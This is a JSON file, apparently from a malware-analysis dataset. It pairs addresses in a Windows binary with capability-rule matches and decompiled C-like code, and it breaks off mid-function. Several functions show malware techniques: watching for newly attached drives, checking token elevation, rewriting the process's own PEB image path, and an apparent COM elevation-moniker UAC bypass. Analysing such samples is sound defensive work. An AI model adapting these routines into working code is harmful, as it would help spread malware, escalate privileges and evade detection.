{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00401000(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t arg_8h_02;\n    int32_t arg_ch_00;\n    int32_t arg_8h_03;\n    int32_t arg_8h_04;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    // [00] -r-x section size 32768 named .text\n    var_ch = 0;\n    arg_ch = fcn.00402e19();\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    arg_8h = fcn.00402d53(0xf);\n    arg_8h_00 = fcn.00407f6a(0xb, 0);\n    arg_8h_01 = fcn.00407f6a(0xc, 0);\n    arg_8h_02 = fcn.00407f6a(0x14, 0);\n    arg_ch_00 = fcn.00407f6a(0x16, 0);\n    var_4h = fcn.00404cfe(0x20a);\n    var_8h = 0;\n    arg_8h_03 = fcn.00402dc9(0xd, arg_ch);\n    arg_8h_04 = fcn.00402dc9(0xe, arg_ch);\n    uVar4 = 0;\n    if (var_4h != 0) {\n        if (arg_8h != 0) {\n            fcn.00402a3d(&var_8h);\n        }\n        if ((arg_8h_02 != 0) && (iVar2 = fcn.00404d94(arg_8h_02),  iVar2 != 0)) {\n            do {\n                if (((uVar1 & 1 << (uVar4 & 0x1f)) != 0) && (iVar2 = fcn.00402a3d(&var_8h),  iVar2 == 0)) break;\n                uVar4 = uVar4 + 1;\n                uVar3 = fcn.00404d94(arg_8h_02);\n            } while (uVar4 < uVar3);\n        }\n        if (var_8h != 0) {\n            var_18h = 0;\n            iVar2 = fcn.00402a0f(0);\n            while (iVar2 != 0) {\n                if (((arg_8h_00 != 0) && (arg_8h_03 != 0)) && (iVar2 = fcn.0040861d(var_4h, 0x104, 3),  iVar2 != 0)) {\n                    fcn.00404d81(arg_8h_03);\n                    iVar2 = fcn.00402b09(var_4h, arg_8h_03);\n                    if (iVar2 != 0) {\n                        if (arg_ch_00 != 0) {\n                            fcn.00402f36(var_4h, arg_ch_00);\n                        }\n                        var_ch = var_ch + 1;\n                    }\n                }\n                if (((arg_8h_01 != 0) && (arg_8h_04 != 0)) && (iVar2 = fcn.0040861d(var_4h, 0x104, 3),  iVar2 != 0)) {\n                    fcn.00404d81(arg_8h_04);\n                    iVar2 = fcn.00402b09(var_4h, arg_8h_04);\n                    if (iVar2 != 0) {\n                        var_ch = var_ch + 1;\n                    }\n                }\n                var_18h = var_18h + 1;\n                iVar2 = fcn.00402a0f(var_18h);\n            }\n        }\n    }\n    fcn.00402b7a(arg_ch_00);\n    fcn.00402b7a(arg_8h);\n    fcn.00402b7a(arg_8h_00);\n    fcn.00402b7a(arg_8h_01);\n    fcn.00402b7a(arg_8h_02);\n    fcn.00402b99(arg_8h_03);\n    fcn.00402b99(arg_8h_04);\n    if (var_4h != 0) {\n        fcn.00404d6a(var_4h);\n    }\n    if (var_8h != 0) {\n        fcn.00404d6a(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 1175
    },
    "0040160b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040160b(uint hostlong)\n\n{\n    uint16_t *arg_8h;\n    uint32_t *arg_8h_00;\n    uint32_t *arg_8h_01;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_c4h;\n    uint var_44h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_18h = 0;\n    arg_8h = fcn.00407f6a(1, 0);\n    arg_8h_00 = fcn.00407f6a(0x13, &var_1ch);\n    arg_8h_01 = fcn.00407f6a(0x2e, 0);\n    var_8h = fcn.00407f6a(2, &var_ch);\n    var_10h = fcn.00407f6a(3, &var_14h);\n    if (((arg_8h != NULL) && (var_8h != 0)) && (var_10h != 0)) {\n        var_24h = (*_sym.imp.WS2_32.dll_htonl)(hostlong);\n        var_20h = *arg_8h;\n        fcn.00404c71(&var_44h, var_8h, 0x20);\n        uVar1 = fcn.004056ca(var_ch);\n        *arg_8h_00 = *arg_8h_00 ^ uVar1 & *arg_8h_01;\n        if (*arg_8h_00 == 0) {\n            *arg_8h_01 = 0x20;\n        }\n        else {\n            *arg_8h_01 = var_1ch >> 1;\n        }\n        iVar2 = fcn.0040895e(&var_44h);\n        if (iVar2 != 0) {\n            iVar2 = fcn.00407e4d(var_8h, var_ch, var_10h, var_14h, &var_44h, &var_c4h);\n            if (iVar2 != 0) {\n                var_18h = fcn.0040578b(&var_44h, &var_c4h);\n            }\n        }\n    }\n    fcn.00404c43(&var_44h, 0, 0x28);\n    fcn.00402b57(arg_8h_00, 4);\n    fcn.00402b57(arg_8h_01, 4);\n    fcn.00402b57(var_8h, var_ch);\n    fcn.00402b57(var_10h, var_14h);\n    fcn.00402b57(arg_8h, 2);\n    return var_18h;\n}\n",
        "token_count": 678
    },
    "0040197c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040197c(uint *arg_8h)\n\n{\n    uint hostlong;\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint arg_ch;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uStack36;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    char16_t cStack12;\n    \n    uStack36 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    hostlong = fcn.00402e19();\n    arg_8h_00 = fcn.00407f6a(0x14, 0);\n    uStack24 = str._X:._0_4_;\n    uStack20 = str._X:._4_4_;\n    uStack16 = str._X:._8_4_;\n    cStack12 = str._X:[6];\n    iVar1 = fcn.004043ed();\n    if (arg_8h_00 != 0) {\n        if (iVar1 == 0) goto code_r0x00401a87;\n        while (iVar4 = fcn.00404c0c(),  iVar4 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n            if (uVar2 != uStack36) {\n                iStack28 = 0;\n                do {\n                    if ((~uStack36 & uVar2 & 1 << (iStack28 & 0x1f)) != 0) {\n                        uVar5 = arg_8h[2];\n                        uVar3 = *arg_8h;\n                        uStack16 = uStack16 & 0xffff0000 | *(arg_8h_00 + iStack28 * 2);\n                        arg_ch = fcn.0040160b(hostlong);\n                        fcn.00404b5c(&uStack24, arg_ch, uVar3, uVar5);\n                        iVar4 = arg_8h[1];\n                        if (iVar4 != 0) {\n                            uVar5 = arg_8h[2];\n                            uVar3 = fcn.0040160b(hostlong);\n                            fcn.00404b5c(&uStack24, uVar3, iVar4, uVar5);\n                        }\n                    }\n                    iStack28 = iStack28 + 1;\n                } while (iStack28 < 0x20);\n                fcn.0040450c();\n                uStack36 = uVar2;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n    }\n    if (iVar1 != 0) {\n        fcn.004043bf();\n    }\ncode_r0x00401a87:\n    fcn.00402b7a(arg_8h_00);\n    return 0;\n}\n",
        "token_count": 649
    },
    "00401e4e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401e4e(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_18h;\n    int32_t iVar1;\n    uint var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0;\n    var_14h = NULL;\n    var_10h = 0;\n    var_8h = 0x10c;\n    arg_8h_00 = fcn.00404cfe(0x21a);\n    var_4h = 0;\n    var_ch = arg_8h_00;\n    arg_18h = fcn.004043ed();\n    if (arg_18h != 0) {\n        if (arg_8h_00 != 0) {\n            fcn.00404c71(arg_8h_00, L\"\\\\\\\\?\\\\UNC\\\\\\\\\\\\\u4449\", 0x10);\n            var_8h = var_8h + -8;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(arg_8h_00 + 0x10, &var_8h);\n            if (iVar1 != 0) {\n                fcn.00402a3d(&var_4h);\n            }\n            iVar1 = fcn.00404c0c();\n            while (iVar1 == 0) {\n                fcn.00401a9c(1, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                fcn.00401a9c(4, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                fcn.00401a9c(5, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                fcn.00401a9c(3, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                fcn.00401a9c(2, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                var_14h = &var_4h;\n                var_18h = arg_8h;\n                var_10h = arg_18h;\n                fcn.00404311(&var_18h);\n                fcn.0040450c();\n                if (var_4h != 0) {\n                    fcn.00404d6a(var_4h);\n                    var_4h = 0;\n                }\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar1 = fcn.00404c0c();\n                arg_8h_00 = var_ch;\n            }\n        }\n        fcn.004043bf();\n    }\n    if (var_4h != 0) {\n        fcn.00404d6a(var_4h);\n    }\n    if (arg_8h_00 != 0) {\n        fcn.00404d6a(arg_8h_00);\n    }\n    return 0;\n}\n",
        "token_count": 737
    },
    "00401fab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401fab(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00407f6a(10, 0);\n    var_4h = 0;\n    fcn.00402a3d(&var_4h);\n    if (var_4h != 0) {\n        while (iVar1 = fcn.00404c0c(),  iVar1 == 0) {\n            fcn.00403e82(var_4h);\n            (*_sym.imp.KERNEL32.dll_Sleep)(500);\n        }\n        fcn.00404d6a(var_4h);\n    }\n    if (arg_8h_00 != 0) {\n        fcn.00402b7a(arg_8h_00);\n    }\n    return 0;\n}\n",
        "token_count": 209
    },
    "00402013": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402013(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00402ed1();\n    do {\n        iVar2 = fcn.00404c0c();\n        if (iVar2 != 0) {\n            iVar2 = fcn.00404c0c();\n            if (iVar2 != 0) {\n                return 0;\n            }\n        }\n        iVar2 = fcn.0040405b(iVar1 == 0);\n        if (iVar2 == 0) {\n            if (iVar1 == 0) {\n                puVar3 = *arg_8h;\n            }\n            else {\n                puVar3 = arg_8h[1];\n            }\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar3 + 1);\n            *puVar3 = 1;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar3 + 1);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 257
    },
    "00402539": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t fcn.00402539(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    int32_t *unaff_ESI;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (unaff_ESI[5] < unaff_EBX) {\n        if (*unaff_ESI == 0) {\n            iVar2 = fcn.00404cfe(unaff_EBX);\n        }\n        else {\n            iVar2 = fcn.00404d43(*unaff_ESI, unaff_EBX);\n        }\n        if (iVar2 != 0) {\n            uVar1 = unaff_ESI[2];\n            if ((unaff_ESI[3] < uVar1) || ((uVar1 == unaff_ESI[3] && (unaff_ESI[4] != 0)))) {\n                fcn.00404c96(((uVar1 - *unaff_ESI) - unaff_ESI[5]) + iVar2 + unaff_EBX, (uVar1 - *unaff_ESI) + iVar2, \n                             unaff_ESI[1] - uVar1);\n                iVar3 = *unaff_ESI;\n                unaff_ESI[2] = unaff_ESI[2] + ((iVar2 - iVar3) - unaff_ESI[5]) + unaff_EBX;\n            }\n            else {\n                iVar3 = *unaff_ESI;\n                unaff_ESI[2] = (uVar1 - iVar3) + iVar2;\n            }\n            unaff_ESI[3] = unaff_ESI[3] + (iVar2 - iVar3);\n            *unaff_ESI = iVar2;\n            unaff_ESI[1] = iVar2 + unaff_EBX;\n            unaff_ESI[5] = unaff_EBX;\n            var_4h = unaff_EBX;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 466
    },
    "00402a3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402a3d(int16_t **arg_8h)\n\n{\n    ushort uVar1;\n    int16_t *in_EAX;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t iVar6;\n    ushort *extraout_EDX;\n    int32_t iVar7;\n    bool bVar8;\n    uint var_4h;\n    \n    iVar7 = 0;\n    piVar5 = *arg_8h;\n    if ((in_EAX == NULL) || (*in_EAX == 0)) {\n        bVar8 = true;\n    }\n    else {\n        if (piVar5 == NULL) {\n            iVar4 = fcn.00404d94(in_EAX);\n            piVar5 = fcn.00404cfe(iVar4 * 2 + 4);\n        }\n        else {\n            iVar6 = *piVar5;\n            piVar3 = piVar5;\n            while (iVar6 != 0) {\n                do {\n                    iVar4 = iVar7;\n                    piVar2 = piVar3;\n                    piVar3 = piVar2 + 1;\n                    iVar7 = iVar4 + 1;\n                } while (*piVar3 != 0);\n                piVar3 = piVar2 + 2;\n                iVar7 = iVar4 + 2;\n                iVar6 = *piVar3;\n            }\n            iVar4 = fcn.00404d94(in_EAX);\n            piVar5 = fcn.00404d43(piVar5, (iVar4 + iVar7) * 2 + 4);\n        }\n        if (piVar5 != NULL) {\n            *arg_8h = piVar5;\n            piVar3 = piVar5 + iVar7;\n            do {\n                for (; (piVar5 = piVar3,  *in_EAX != 0 && (*in_EAX != 0x3b)); in_EAX = in_EAX + 1) {\n                    uVar1 = fcn.00408681();\n                    *extraout_EDX = uVar1;\n                    piVar3 = extraout_EDX + 1;\n                }\n                *piVar5 = 0;\n                iVar6 = *in_EAX;\n                in_EAX = in_EAX + 1;\n                piVar3 = piVar5 + 1;\n            } while (iVar6 != 0);\n            piVar5[1] = 0;\n            piVar5 = piVar5 + 2;\n        }\n        bVar8 = piVar5 != NULL;\n    }\n    return bVar8;\n}\n",
        "token_count": 583
    },
    "00402b57": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b57(int32_t arg_8h, uint arg_ch)\n\n{\n    if (arg_8h != 0) {\n        fcn.00404c43(arg_8h, 0, arg_ch);\n        fcn.00404d6a(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "00402b7a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b7a(int32_t arg_8h)\n\n{\n    uint arg_ch;\n    \n    if (arg_8h != 0) {\n        arg_ch = fcn.00404d94(arg_8h);\n        fcn.00402b57(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "00402b99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b99(int32_t arg_8h)\n\n{\n    uint arg_ch;\n    \n    if (arg_8h != 0) {\n        arg_ch = fcn.00404d81(arg_8h);\n        fcn.00402b57(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "00402e5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e5c(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t arg_8h_01;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00407f6a(0x1a, &var_8h);\n    iVar1 = fcn.00404d81(arg_8h_00);\n    iVar1 = iVar1 + 1 + arg_8h_00;\n    var_4h = 2;\n    arg_8h_01 = arg_8h_00;\n    do {\n        var_4h = var_4h + -1;\n        iVar2 = fcn.00404d81(arg_8h_01);\n        arg_8h_01 = arg_8h_01 + 1 + iVar2;\n    } while (var_4h != 0);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(arg_8h_00);\n    if (iVar2 != 0) {\n        if (arg_ch != 0) {\n            iVar1 = arg_8h_01;\n        }\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, iVar1);\n        if (pcVar3 != NULL) {\n            (*pcVar3)(arg_8h);\n        }\n    }\n    fcn.00402b57(arg_8h_00, var_8h);\n    return;\n}\n",
        "token_count": 368
    },
    "00402ed1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00402ed1(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint TokenInformation;\n    uint ReturnLength;\n    int32_t TokenHandle;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    TokenHandle = 0;\n    if (uVar1 < 6) {\n        uVar3 = 1;\n    }\n    else {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        uVar3 = 0;\n        if (iVar2 != 0) {\n            ReturnLength = 4;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength)\n            ;\n            if (iVar2 != 0) {\n                uVar3 = TokenInformation;\n            }\n        }\n        if (TokenHandle != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 263
    },
    "00402f79": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402f79(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint lpFilename;\n    uint var_2a4h;\n    uint var_90h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_48h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    code *var_1ch;\n    int32_t *var_18h;\n    code *var_14h;\n    code *var_10h;\n    code *var_ch;\n    int32_t hObject;\n    \n    var_24h = 0;\n    arg_8h_00 = fcn.00407f6a(0x1b, &var_28h);\n    iVar3 = fcn.00404d81(arg_8h_00);\n    hObject = 2;\n    iVar6 = arg_8h_00;\n    do {\n        hObject = hObject + -1;\n        iVar4 = fcn.00404d81(iVar6);\n        iVar6 = iVar6 + 1 + iVar4;\n        var_14h = iVar6;\n    } while (hObject != 0);\n    hObject = 3;\n    iVar6 = arg_8h_00;\n    do {\n        hObject = hObject + -1;\n        iVar4 = fcn.00404d81(iVar6);\n        iVar6 = iVar6 + 1 + iVar4;\n        var_10h = iVar6;\n    } while (hObject != 0);\n    hObject = 4;\n    iVar6 = arg_8h_00;\n    do {\n        hObject = hObject + -1;\n        iVar4 = fcn.00404d81(iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n        iVar6 = iVar6 + 1 + iVar4;\n        var_1ch = iVar6;\n    } while (hObject != 0);\n    hObject = -1;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(arg_8h_00, iVar3 + 1 + arg_8h_00);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    var_ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n    uVar5 = (*pcVar2)(arg_8h_00, var_14h);\n    var_14h = (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(arg_8h_00, var_10h);\n    var_10h = (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(arg_8h_00, var_1ch);\n    var_1ch = (*pcVar1)(uVar5);\n    if ((((arg_8h != 0) && (var_ch != NULL)) && (var_14h != NULL)) && ((var_10h != NULL && (var_1ch != NULL)))) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x438, 0, uVar5);\n        hObject = iVar6;\n        if (((iVar6 != -1) &&\n            ((iVar3 = (*var_14h)(iVar6, 0, &var_60h, 0x18, 0),  pcVar2 = _sym.imp.KERNEL32.dll_ReadProcessMemory, \n             iVar3 == 0 &&\n             (iVar6 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(iVar6, var_5ch, &var_48h, 0x20, 0),  iVar6 != 0)))) &&\n           (iVar6 = (*pcVar2)(hObject, var_3ch, &var_90h, 0x30, 0),  iVar6 != 0)) {\n            (*var_10h)(var_2ch);\n            (*var_ch)(var_38h + 0x38, arg_8h);\n            (*var_ch)(var_38h + 0x40, arg_8h);\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &lpFilename, 0x104);\n            var_20h = *(var_3ch + 0xc);\n            do {\n                iVar6 = (*pcVar2)(hObject, &var_20h, &var_18h, 4, 0);\n                if ((iVar6 == 0) ||\n                   (iVar6 = (*pcVar2)(hObject, var_18h[10], &var_2a4h, *(var_18h + 0x26), 0),  iVar6 == 0)) break;\n                iVar6 = fcn.0040880c();\n                if (iVar6 == 0) {\n                    (*var_ch)(var_18h + 9, arg_8h);\n                    (*var_ch)(var_18h + 0xb, arg_8h);\n                    var_24h = 1;\n                    break;\n                }\n            } while (*var_18h != var_20h);\n            (*var_1ch)(var_2ch);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    fcn.00402b57(arg_8h_00, var_28h);\n    return var_24h;\n}\n",
        "token_count": 1275
    },
    "004031b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004031b5(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint pBindOptions;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint pszName;\n    int32_t *var_10h;\n    code *var_ch;\n    int32_t *var_8h;\n    int32_t *ppv;\n    \n    var_18h = 0;\n    arg_8h_00 = fcn.00407f6a(0x1d, &var_1ch);\n    iVar1 = fcn.00404d81(arg_8h_00);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(arg_8h_00, iVar1 + 1 + arg_8h_00);\n    var_ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    pszName = fcn.00407f6a(0x1e, 0);\n    pBindOptions = 0;\n    puVar3 = &var_3ch;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    ppv = NULL;\n    var_8h = NULL;\n    var_10h = NULL;\n    if (var_ch == NULL) goto code_r0x004032fd;\n    pBindOptions = 0x24;\n    var_2ch = 4;\n    iVar1 = (*_sym.imp.ole32.dll_CoGetObject)(pszName, &pBindOptions, 0x4091b8, &ppv);\n    if (iVar1 == 0) {\n        iVar1 = (**(*ppv + 0x14))(ppv, (-(0x3a95 < arg_18h) & 0xfffbfbfc) + 0x10840414);\n        if (iVar1 == 0) {\n            iVar1 = (*var_ch)(arg_ch, 0, 0x4091a8, &var_8h);\n            if (iVar1 == 0) {\n                if (arg_8h == 1) {\n                    iVar1 = (*var_ch)(arg_10h, 0, 0x4091a8, &var_10h);\n                    if (iVar1 == 0) {\n                        iVar1 = (**(*ppv + 0x40))(ppv, var_8h, var_10h, arg_14h, 0);\ncode_r0x004032be:\n                        if (iVar1 == 0) {\n                            iVar1 = (**(*ppv + 0x54))(ppv);\n                            if (iVar1 == 0) {\n                                var_18h = 1;\n                            }\n                        }\n                    }\n                }\n                else if (arg_8h == 2) {\n                    iVar1 = (**(*ppv + 0x48))(ppv, var_8h, 0);\n                    goto code_r0x004032be;\n                }\n            }\n        }\n    }\n    if (var_10h != NULL) {\n        (**(*var_10h + 8))(var_10h);\n    }\n    if (var_8h != NULL) {\n        (**(*var_8h + 8))(var_8h);\n    }\n    if (ppv != NULL) {\n        (**(*ppv + 8))(ppv);\n    }\ncode_r0x004032fd:\n    fcn.00402b7a(pszName);\n    fcn.00402b57(arg_8h_00, var_1ch);\n    return var_18h;\n}\n",
        "token_count": 869
    },
    "004033bd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004033bd(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    ushort *arg_8h_00;\n    int32_t iVar1;\n    ushort *puVar2;\n    int32_t iVar3;\n    code *arg_ch_00;\n    uint var_10h;\n    ushort *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00402d53(0x1f);\n    iVar1 = fcn.00404d94(arg_8h_00);\n    puVar2 = fcn.00404e26(arg_8h_00, 0x3b);\n    *puVar2 = 0;\n    var_ch = fcn.00404e26(puVar2 + 1, 0x3b);\n    *var_ch = 0;\n    var_4h = 0;\n    var_ch = var_ch + 1;\n    var_10h = arg_8h;\n    var_8h = arg_14h;\n    iVar3 = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    if (iVar3 == 0) {\n        arg_ch_00 = fcn.00403355;\n        if (arg_ch == 0) {\n            arg_ch_00 = fcn.00403319;\n        }\n        puVar2 = puVar2 + 1;\n        if (arg_10h == 0) {\n            puVar2 = arg_8h_00;\n        }\n        fcn.00408338(puVar2, arg_ch_00, &var_10h, 0x104, 1);\n        